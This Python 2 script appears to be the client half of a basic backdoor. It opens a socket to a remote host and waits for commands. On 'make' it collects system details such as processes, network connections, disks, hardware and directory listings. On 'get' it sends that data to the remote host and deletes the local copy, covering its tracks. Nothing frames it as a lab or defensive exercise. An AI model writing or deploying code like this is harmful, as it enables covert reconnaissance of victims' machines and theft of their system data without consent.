import socket, sys, os, time, webbrowser
from subprocess import PIPE, Popen, call

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_addr,port))
    shellinput(s)

def shellinput(s):    
    while True:
        command = s.recv(1024)
        
        if 'make' in command:
            makeinfo(s)
        elif 'get' in command:
            sending(s)

        elif 'exit' in command:
            s.close()
            os.system('rm -rf sys.txt')
            logout()
            break

def logout():
    sys.exit()

def makeinfo(s):
    file = open ('sysinfo.txt', 'w')
     
    file.write((Popen('uname -a', stdout = PIPE, shell = True)).stdout.read())
    call('ps', stdout = file)
    file.write((Popen("netstat | grep tcp", stdout= PIPE, shell = True)).stdout.read())
    #call('lshw', stdout = file)
    #file.write((Popen('lshw -short', stdout = PIPE, shell = True)).stdout.read())
    call('lscpu', stdout = file)
    file.write((Popen('lsblk -a', stdout = PIPE, shell= True)).stdout.read())
    call('lspci', stdout = file)
   #call('lsscsi', stdout = file)
    file.write((Popen('hdparm /dev/sda1', stdout = PIPE, shell = True)).stdout.read())
    file.write((Popen('fdisk -l', stdout = PIPE, shell = True)).stdout.read())
    file.write((Popen('dmidecode -t memory', stdout = PIPE, shell = True)).stdout.read())
    file.write((Popen('ls /', stdout = PIPE, shell = True)).stdout.read())
    call('ls', stdout = file)

    file.close()  

def sending(s):
    file_new= open('sysinfo.txt', 'rb')
    packet = file_new.read(1024)    
    
    while (packet):
        s.send(packet)
        packet = file_new.read()
    os.system('rm -rf sysinfo.txt')
    s.shutdown(socket.SHUT_WR)

    shellinput(s)

